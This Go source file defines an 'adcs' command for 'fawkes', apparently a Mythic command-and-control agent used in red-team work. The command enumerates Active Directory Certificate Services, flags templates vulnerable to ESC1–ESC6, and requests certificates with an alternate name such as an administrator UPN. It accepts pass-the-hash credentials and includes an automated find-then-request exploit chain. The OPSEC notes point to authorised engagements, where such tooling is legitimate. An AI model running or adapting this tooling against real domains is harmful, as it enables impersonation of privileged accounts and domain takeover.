package agentfunctions

import (
	"encoding/json"
	"fmt"
	"path/filepath"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/logging"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name: "adcs",
		AssociatedBrowserScript: &agentstructs.BrowserScript{
			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "adcs_new.js"),
			Author:     "@galoryber",
		},
		Description:         "Enumerate AD Certificate Services (ADCS), find vulnerable templates (ESC1-ESC4, ESC6 via DCOM), and request certificates via DCOM.",
		HelpString:          "adcs -action find -server 192.168.1.1 -username user@domain.local -password pass\nadcs -action cas -server dc01\nadcs -action templates -server dc01\nadcs -action request -server ca01 -ca_name CA-NAME -template User -username DOMAIN\\user -password pass [-alt_name admin@domain.local]",
		Version:             1,
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1649"},
		TaskCompletionFunctions: map[string]agentstructs.PTTaskCompletionFunction{
			"adcsFindDone":    adcsFindDone,
			"adcsExploitDone": adcsExploitDone,
		},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{
				agentstructs.SUPPORTED_OS_WINDOWS,
				agentstructs.SUPPORTED_OS_LINUX,
				agentstructs.SUPPORTED_OS_MACOS,
			},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "action",
				CLIName:          "action",
				ModalDisplayName: "Action",
				Description:      "cas: list CAs, templates: list templates, find: find vulnerable templates, request: request a certificate via DCOM, auto-exploit: automated find→request chain",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"find", "cas", "templates", "request", "auto-exploit"},
				DefaultValue:     "find",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default"},
				},
			},
			{
				Name:                 "server",
				CLIName:              "server",
				ModalDisplayName:     "Server",
				Description:          "DC/CA server IP address or hostname",
				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:         "",
				DynamicQueryFunction: getActiveHostList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default"},
				},
			},
			{
				Name:                 "username",
				CLIName:              "username",
				ModalDisplayName:     "Username",
				Description:          "Username (DOMAIN\\user or user@domain format)",
				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:         "",
				DynamicQueryFunction: getCallbackUserList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "password",
				CLIName:          "password",
				ModalDisplayName: "Password",
				Description:      "Password for authentication",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "hash",
				CLIName:          "hash",
				ModalDisplayName: "NT Hash",
				Description:      "NT hash for pass-the-hash authentication (request action only)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "domain",
				CLIName:          "domain",
				ModalDisplayName: "Domain",
				Description:      "Domain name (auto-parsed from username if DOMAIN\\user or user@domain format)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				DynamicQueryFunction: getCallbackDomainList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "port",
				CLIName:          "port",
				ModalDisplayName: "Port",
				Description:      "LDAP port (default: 389, or 636 for LDAPS). Not used for request action.",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				DefaultValue:     389,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "use_tls",
				CLIName:          "use_tls",
				ModalDisplayName: "Use LDAPS",
				Description:      "Use TLS/LDAPS instead of plain LDAP. Not used for request action.",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
				DefaultValue:     false,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "ca_name",
				CLIName:          "ca_name",
				ModalDisplayName: "CA Name",
				Description:      "Certificate Authority name (from 'adcs -action cas'). Required for request action.",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "template",
				CLIName:          "template",
				ModalDisplayName: "Template",
				Description:      "Certificate template name (e.g., 'User', 'Machine', or a vulnerable template). Required for request action.",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "subject",
				CLIName:          "subject",
				ModalDisplayName: "Subject",
				Description:      "Certificate subject (e.g., 'CN=user'). Defaults to CN=<username>.",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "alt_name",
				CLIName:          "alt_name",
				ModalDisplayName: "Alt Name (SAN)",
				Description:      "Subject Alternative Name for ESC1/ESC6 (e.g., 'administrator@domain.local' for UPN impersonation)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "timeout",
				CLIName:          "timeout",
				ModalDisplayName: "Timeout",
				Description:      "Connection timeout in seconds (default: 30). Used for request action.",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				DefaultValue:     30,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
		},
		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
				TaskID:              taskData.Task.ID,
				Success:             true,
				OpsecPostBlocked:    false,
				OpsecPostMessage:    "OPSEC AUDIT: ADCS operation completed. Certificate enrollment/request generates Event ID 4887/4886 on the CA. Certificate template modifications are logged in AD. Issued certificates should be revoked after engagement.",
				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			action, _ := taskData.Args.GetStringArg("action")
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID:             taskData.Task.ID,
				Success:            true,
				OpsecPreBlocked:    false,
				OpsecPreMessage:    fmt.Sprintf("OPSEC WARNING: AD Certificate Services %s operation. ADCS exploitation generates certificate enrollment events (Event ID 4886/4887) and LDAP queries against CA configuration. Misconfigured template abuse (ESC1-ESC8) is increasingly monitored by purple teams.", action),
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}

			action, _ := taskData.Args.GetStringArg("action")
			server, _ := taskData.Args.GetStringArg("server")

			if action == "auto-exploit" {
				// Automated chain: find → parse vulnerabilities → request
				displayMsg := fmt.Sprintf("ADCS auto-exploit chain on %s", server)
				response.DisplayParams = &displayMsg

				// Store chain context (server, credentials) in Stdout for completion functions
				username, _ := taskData.Args.GetStringArg("username")
				password, _ := taskData.Args.GetStringArg("password")
				hash, _ := taskData.Args.GetStringArg("hash")
				domain, _ := taskData.Args.GetStringArg("domain")
				port, _ := taskData.Args.GetNumberArg("port")
				useTLS, _ := taskData.Args.GetBooleanArg("use_tls")
				chainCtx, _ := json.Marshal(map[string]interface{}{
					"server":   server,
					"username": username,
					"password": password,
					"hash":     hash,
					"domain":   domain,
					"port":     port,
					"use_tls":  useTLS,
				})
				chainCtxStr := string(chainCtx)
				response.Stdout = &chainCtxStr

				// Build find subtask params
				findParams, _ := json.Marshal(map[string]interface{}{
					"action":   "find",
					"server":   server,
					"username": username,
					"password": password,
					"hash":     hash,
					"domain":   domain,
					"port":     port,
					"use_tls":  useTLS,
				})

				callbackFunc := "adcsFindDone"
				_, err := mythicrpc.SendMythicRPCTaskCreateSubtask(mythicrpc.MythicRPCTaskCreateSubtaskMessage{
					TaskID:                  taskData.Task.ID,
					SubtaskCallbackFunction: &callbackFunc,
					CommandName:             "adcs",
					Params:                  string(findParams),
				})
				if err != nil {
					logging.LogError(err, "Failed to create ADCS find subtask")
					response.Success = false
					response.Error = "Failed to create find subtask: " + err.Error()
				}

				return response
			}

			displayMsg := fmt.Sprintf("ADCS %s on %s", action, server)
			if action == "request" {
				template, _ := taskData.Args.GetStringArg("template")
				caName, _ := taskData.Args.GetStringArg("ca_name")
				altName, _ := taskData.Args.GetStringArg("alt_name")
				displayMsg = fmt.Sprintf("ADCS request template=%s ca=%s on %s", template, caName, server)
				if altName != "" {
					displayMsg += fmt.Sprintf(" (SAN: %s)", altName)
				}
			}
			response.DisplayParams = &displayMsg

			artifactType := "API Call"
			artifactMsg := fmt.Sprintf("LDAP ADCS query: %s on %s", action, server)
			if action == "request" {
				artifactMsg = fmt.Sprintf("DCOM ICertRequestD::Request on %s", server)
			}

			mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
				TaskID:           taskData.Task.ID,
				BaseArtifactType: artifactType,
				ArtifactMessage:  artifactMsg,
			})

			return response
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			action, _ := processResponse.TaskData.Args.GetStringArg("action")
			server, _ := processResponse.TaskData.Args.GetStringArg("server")

			switch action {
			case "find":
				// Track CA discovery and vulnerable templates
				if strings.Contains(responseText, "Certificate Authority") || strings.Contains(responseText, "CA:") {
					mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
						TaskID:           processResponse.TaskData.Task.ID,
						BaseArtifactType: "Configuration",
						ArtifactMessage:  fmt.Sprintf("ADCS enumeration on %s: CA infrastructure discovered", server),
					})
				}
				// Flag vulnerable templates
				for _, esc := range []string{"ESC1", "ESC2", "ESC3", "ESC4", "ESC6"} {
					if strings.Contains(responseText, esc) {
						mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
							TaskID:           processResponse.TaskData.Task.ID,
							BaseArtifactType: "Configuration",
							ArtifactMessage:  fmt.Sprintf("ADCS vulnerable template detected: %s on %s", esc, server),
						})
					}
				}
			case "request":
				// Track certificate request as Credential artifact
				template, _ := processResponse.TaskData.Args.GetStringArg("template")
				mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
					TaskID:           processResponse.TaskData.Task.ID,
					BaseArtifactType: "Credential",
					ArtifactMessage:  fmt.Sprintf("Certificate requested: template=%s from %s", template, server),
				})
			}
			return response
		},
	})
}
